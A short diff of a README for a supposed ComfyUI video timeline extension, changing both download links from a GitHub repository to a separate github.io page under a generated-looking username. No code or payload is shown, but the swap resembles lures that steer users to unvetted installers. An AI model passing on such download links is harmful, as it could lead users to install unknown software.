@@ -1,6 +1,6 @@
 # 🎬 ComfyUI-MiniMaxH3-Director - Timeline Editor for Video Generation
 
-[![Download Now](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Shortiaallurement927/ComfyUI-MiniMaxH3-Director)
+[![Download Now](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge&logo=github)](https://shortiaallurement927.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ComfyUI-MiniMaxH3-Director, your all-in-one timeline editor for creat
 
 ### 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/Shortiaallurement927/ComfyUI-MiniMaxH3-Director](https://github.com/Shortiaallurement927/ComfyUI-MiniMaxH3-Director)
+Visit this link to download the application: [https://shortiaallurement927.github.io](https://shortiaallurement927.github.io)
 
 Once downloaded, follow these simple steps:
 
